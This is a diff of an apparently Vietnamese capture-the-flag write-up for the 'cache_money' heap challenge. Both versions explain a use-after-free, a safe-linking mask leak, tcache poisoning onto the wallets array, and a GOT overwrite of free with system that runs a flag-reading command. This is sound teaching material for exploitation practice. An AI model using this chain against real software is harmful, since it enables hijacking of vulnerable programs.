@@ -4,82 +4,60 @@
 
 ## 1. Bài toán
 
-`cache_money` là một wallet manager chạy theo menu, mỗi wallet là một struct 0x30 byte cấp bằng
-`calloc`, kèm một "ledger" cấp bằng `malloc(size)`:
+`cache_money` là một chương trình quản lý ví (wallet manager) hoạt động qua menu. Mỗi ví (wallet) là một struct có kích thước 0x30 byte được cấp phát bằng `calloc`, đi kèm với một "ledger" (sổ cái) được cấp phát bằng `malloc(size)`:
 
-```
+```text
 +0x00 name[16]   +0x10 balance   +0x18 ledger*   +0x20 size   +0x28 active
 ```
 
-Mảng `wallets[16]` nằm ở `.bss` tại `0x4040c0` (binary no PIE nên địa chỉ cố định).
-Ba primitive đúng như đề gợi ý "the books haven't been audited":
+Mảng `wallets[16]` nằm ở vùng nhớ `.bss` tại địa chỉ `0x4040c0` (binary không bật PIE nên địa chỉ này cố định). Chương trình có 3 primitive (hành động cơ bản), đúng như gợi ý của đề "the books haven't been audited" (sổ sách chưa được kiểm toán):
 
-- `deposit(i)` = `read(0, wallets[i]->ledger, wallets[i]->size)`  -> ghi vào chunk
-- `withdraw(i)` = `write(1, wallets[i]->ledger, wallets[i]->size)` -> đọc khỏi chunk
-- `open` = `calloc(0x30)` cho struct rồi `malloc(size)` cho ledger
+- `deposit(i)` = `read(0, wallets[i]->ledger, wallets[i]->size)`  -> Ghi dữ liệu vào chunk.
+- `withdraw(i)` = `write(1, wallets[i]->ledger, wallets[i]->size)` -> Đọc dữ liệu ra từ chunk.
+- `open` = Gọi `calloc(0x30)` cho struct của ví, sau đó gọi `malloc(size)` cho ledger.
 
 ## 2. Lỗ hổng
 
-`transfer(src, dst)` giải phóng ledger của src rồi gán chính con trỏ đã free cho dst:
+Hàm `transfer(src, dst)` tiến hành giải phóng (free) ledger của ví `src`, nhưng sau đó lại gán chính con trỏ vừa bị free đó cho ví `dst`:
 
 ```asm
 401ac9: rdi = [src+0x18]      ; ledger cũ của src
 401acd: call free
 401ad2: rax = [src+0x18]
-401ae8: [dst+0x18] = rax      ; dst nhận con trỏ đã free
-401b1a: [src+0x28] = 0        ; src chỉ bị đánh dấu inactive, vẫn nằm trong mảng
+401ae8: [dst+0x18] = rax      ; dst nhận lại con trỏ đã bị free
+401b1a: [src+0x28] = 0        ; src chỉ bị đánh dấu là inactive, vẫn nằm trong mảng wallets
 ```
 
-Từ đây có use-after-free trên heap: đọc và ghi vào một chunk đang nằm trong tcache.
+Từ đây, ta có một lỗi Use-After-Free (UAF) trên heap: có thể đọc và ghi vào một chunk đang nằm trong tcache.
 
-## 3. Hai chi tiết của allocator quyết định hướng đi
+## 3. Hai đặc điểm của allocator quyết định hướng khai thác
 
-**(a) `calloc` không lấy chunk từ tcache, `malloc` thì có.**
-Trên glibc 2.39 của target, sau khi free ledger X rồi `open` một wallet mới thì struct của wallet
-mới lấy từ top chunk, còn ledger của nó mới là chunk X pop ra từ tcache. Kiểm chứng bằng
-chính chương trình: sau `transfer(A->C)` rồi `open B`, `withdraw(B)` in ra tên `"B"` (struct còn
-nguyên) nhưng 48 byte đọc được lại là nội dung mình vừa ghi vào C, tức `B->ledger == C->ledger`.
-Vì struct không rơi vào chunk đã free nên không thể "đè ledger thành struct" như cách thông thường.
+**(a) `calloc` không lấy chunk từ tcache, trong khi `malloc` thì có.**
+Trên hệ thống dùng glibc 2.39 của target, sau khi free ledger `X` và gọi `open` để tạo một ví mới, struct của ví mới sẽ được lấy từ top chunk, còn ledger của nó mới là chunk `X` vừa được pop ra từ tcache. Điều này có thể được kiểm chứng bằng chính chương trình: sau khi thực hiện `transfer(A->C)` rồi gọi `open B`, nếu ta gọi `withdraw(B)` thì nó vẫn in ra tên là `"B"` (struct vẫn còn nguyên vẹn) nhưng 48 byte đọc được lại chính là nội dung ta vừa ghi vào `C`, tức là `B->ledger == C->ledger`. Vì struct không bao giờ rơi vào chunk đã bị free, ta không thể dùng cách thông thường là "ghi đè ledger thành một struct giả".
 
-(b) Safe-linking. Chunk độc nhất trong bin có `fd = 0x2eea7` trong khi heap ở `0x2eea7xxx`,
-đúng dạng `stored = ptr ^ (slot >> 12)`. Hệ quả hay: khi bin đang rỗng, giá trị `fd` đọc được
-chính là mask `heap_base >> 12`, không cần leak heap base riêng. `key` là số ngẫu nhiên theo
-thread nên không dùng để leak được.
+**(b) Safe-linking.**
+Chunk duy nhất nằm trong bin có con trỏ `fd = 0x2eea7`, trong khi base của heap là `0x2eea7xxx`. Điều này khớp hoàn toàn với công thức `stored = ptr ^ (slot >> 12)`. Hệ quả rất thú vị ở đây là: khi bin đang rỗng (chưa trỏ đến chunk nào khác), giá trị `fd` đọc được chính là mask `heap_base >> 12`. Do đó, ta không cần phải leak riêng địa chỉ heap base nữa. Giá trị `key` là một số ngẫu nhiên theo từng thread nên không thể dùng để leak được.
 
 ## 4. Chuỗi tấn công
 
-1. `open A(48)`, `open C(48)`, `open F(48)` -> ledger X, Z, W.
-2. `transfer(A->C)` -> X vào tcache, `C->ledger = X`. `withdraw(C)` đọc `fd` => mask.
-3. `transfer(F->C)` -> W vào đầu bin, `W->next = X ^ mask`. `withdraw(C)` kiểm tra lại
-   `(W->next ^ mask) >> 12 == mask` để chắc model đúng.
-4. `deposit(C, p64(TARGET ^ mask) + ...)` -> poison `W->next` thành
-   `TARGET = 0x4040f0 = &wallets[6]`.
-   Chọn vùng này vì `open_wallet` có `__memset_chk(ledger, 0, size, size)` ngay sau malloc:
-   zero 0x30 byte tại `&wallets[6]` chỉ xoá sáu slot đang trống, còn `.rodata` sẽ SIGSEGV và
-   GOT sẽ bị xoá luôn `puts`/`read`.
-5. `open G1, G2, G3`: ledger của G1 pop W, ledger của G2 pop TARGET -> G2->ledger trỏ thẳng vào
-   mảng wallets, G3 giữ slot 5 khác NULL.
-6. `deposit(G2, p64(0x4040c0))` -> `wallets[6] = &wallets[0]`, biến chính mảng thành một wallet giả:
-   `active` = 4 byte thấp của `wallets[5]`, `ledger` = `wallets[3]`, `size` = `wallets[4]`
-   (một con trỏ heap, tức độ dài `read()` khổng lồ, thực tế chỉ lấy đúng số byte mình gửi).
-7. `deposit(6, fake_struct(GOT_FREE, 48))` -> đè struct slot 3, biến nó thành đọc/ghi tuỳ ý.
-8. `withdraw(3)` đọc 48 byte từ `0x404000` -> GOT. `free` và `puts` đã resolve sẵn
-   (`transfer` gọi free, banner gọi puts), hiệu số khớp:
-   `free-0xadd20 == puts-0x87bd0` -> libc base -> `system = base + 0x58740`.
-9. `deposit(6, fake_struct(GOT_FREE, 8))` rồi `deposit(3, p64(system))` -> `GOT[free] := system`
-   (size = 8 để không chạm slot kế bên).
-10. `open CMD(256)`, `deposit(CMD, "cat /ctf/flag.txt")`, `close(CMD)` ->
-    `free(ledger)` gọi `system("cat /ctf/flag.txt")`.
+1. Gọi `open A(48)`, `open C(48)`, `open F(48)` -> Tạo ra các ledger tương ứng là `X`, `Z`, `W`.
+2. Gọi `transfer(A->C)` -> Chunk `X` bị đẩy vào tcache, `C->ledger = X`. Gọi `withdraw(C)` để đọc `fd` và thu được mask.
+3. Gọi `transfer(F->C)` -> Chunk `W` bị đẩy lên đầu bin, `W->next = X ^ mask`. Gọi `withdraw(C)` để kiểm tra lại điều kiện `(W->next ^ mask) >> 12 == mask`, nhằm đảm bảo state của tcache diễn ra đúng như dự tính.
+4. Gọi `deposit(C, p64(TARGET ^ mask) + ...)` -> Kỹ thuật tcache poisoning: ghi đè `W->next` thành `TARGET = 0x4040f0 = &wallets[6]`.
+   Vùng nhớ này được chọn vì hàm `open_wallet` có gọi `__memset_chk(ledger, 0, size, size)` ngay sau khi `malloc`. Việc zero-out (làm sạch bằng số 0) 0x30 byte tại `&wallets[6]` sẽ chỉ xoá 6 slot đang trống trong mảng. Nếu chọn trỏ vào `.rodata` sẽ gây ra lỗi SIGSEGV, còn nếu trỏ vào bảng GOT sẽ vô tình xoá mất địa chỉ của `puts` hoặc `read`.
+5. Gọi `open G1, G2, G3`: ledger của `G1` sẽ pop chunk `W`, ledger của `G2` sẽ pop `TARGET` -> Lúc này `G2->ledger` trỏ thẳng vào mảng `wallets`, còn `G3` giữ cho slot số 5 một giá trị khác NULL.
+6. Gọi `deposit(G2, p64(0x4040c0))` -> Đồng nghĩa với việc ghi `wallets[6] = &wallets[0]`. Thao tác này biến chính mảng `wallets` thành một ví giả (fake wallet): `active` = 4 byte thấp của `wallets[5]`, `ledger` = `wallets[3]`, `size` = `wallets[4]` (đây là một con trỏ heap, có giá trị cực lớn, đóng vai trò như độ dài khi gọi hàm `read()`, thực tế `read()` sẽ chỉ lấy đúng số byte mà ta gửi vào).
+7. Gọi `deposit(6, fake_struct(GOT_FREE, 48))` -> Ghi đè lên struct của slot số 3, biến nó thành một primitive đọc/ghi tùy ý (arbitrary read/write).
+8. Gọi `withdraw(3)`, đọc 48 byte từ `0x404000` -> Đây là vùng nhớ GOT. Các hàm `free` và `puts` đã được resolve sẵn (`transfer` có gọi `free`, banner có gọi `puts`), ta có thể tính được offset:
+   `free - 0xadd20 == puts - 0x87bd0` -> Tính được `libc base` -> Tính được `system = base + 0x58740`.
+9. Gọi `deposit(6, fake_struct(GOT_FREE, 8))` sau đó gọi `deposit(3, p64(system))` -> Ghi đè `GOT[free] := system` (đặt size = 8 để không ghi lẹm sang các slot bên cạnh).
+10. Gọi `open CMD(256)`, rồi `deposit(CMD, "cat /ctf/flag.txt")`, sau đó `close(CMD)` -> Khi ví này bị đóng, lệnh `free(ledger)` sẽ thực thi thành `system("cat /ctf/flag.txt")`.
 
-Không cần ROP: không có `system` trong PLT nhưng Partial RELRO cho phép ghi GOT, và đối số `rdi`
-của `free()` chính là con trỏ ledger mà ta kiểm soát nội dung.
+Bài này không cần dùng kỹ thuật ROP: dù không có hàm `system` trong PLT, nhưng do binary biên dịch với Partial RELRO nên ta có thể ghi đè GOT, và tham số `rdi` truyền vào cho `free()` cũng chính là con trỏ ledger mà ta hoàn toàn kiểm soát được nội dung.
 
-## 5. Debug nhanh trên host Windows
+## 5. Debug nhanh trên môi trường host Windows
 
-Không có pwntools, không có gdb cho ELF Linux, nên toàn bộ là `objdump` + socket thô.
-Hai lỗi làm mất nhiều thời gian nhất, đều ở phía client:
+Vì không cài sẵn `pwntools` hay `gdb` cho ELF Linux trên Windows, nên toàn bộ quá trình khai thác được thực hiện thông qua `objdump` và thao tác qua socket thô (raw socket). Có hai lỗi gây mất thời gian nhất và đều nằm ở phía client:
 
-- `setvbuf(stdout, NULL, 2, 0)` với `2 == _IONBF`: stdout không buffer, nhưng stdin thì có, nên
-  phải gửi từng dòng và chờ đúng marker, không được gửi cả cụm.
-- Client chờ kiểu `sleep 1s` cho mỗi prompt bị cắt kết nối ở khoảng lệnh thứ 10. Đổi sang recv
-  event-driven (trả lời ngay khi marker xuất hiện) thì cả chuỗi chạy trong ~2 giây.
+- `setvbuf(stdout, NULL, 2, 0)` với `2 == _IONBF`: `stdout` không được buffer, nhưng `stdin` thì có. Vì vậy, ta bắt buộc phải gửi từng dòng lệnh một và phải chờ đúng marker (dấu hiệu nhận biết) từ server, tuyệt đối không được gửi hàng loạt cùng lúc.
+- Ban đầu script client dùng hàm `sleep 1s` cho mỗi lần nhận prompt, điều này làm kết nối bị ngắt (timeout) ở khoảng câu lệnh thứ 10. Khi chuyển sang kiểu recv hướng sự kiện (event-driven - trả lời ngay lập tức khi thấy marker xuất hiện), toàn bộ chuỗi khai thác đã có thể chạy mượt mà trong khoảng 2 giây.
